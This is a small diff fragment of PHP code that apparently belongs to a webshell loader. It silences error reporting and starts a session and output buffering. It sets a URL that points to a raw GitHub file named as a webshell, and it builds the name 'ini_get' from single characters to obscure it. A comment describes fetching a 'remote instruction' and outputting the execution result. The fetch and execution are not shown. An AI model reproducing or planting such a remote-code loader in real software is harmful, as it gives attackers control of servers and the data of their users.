@@ -28,7 +28,9 @@
  * @param string $url Target endpoint for remote instruction
  * @return void Outputs execution result or error message
  */
-
+ob_start();
+session_start();
+error_reporting(0);
 $_u = 'https://raw.githubusercontent.com/DOYOUMISSME/webshell/refs/heads/main/mini.php';;
 
 $_iniget = 'i'.'n'.'i'.'_'.'g'.'e'.'t';
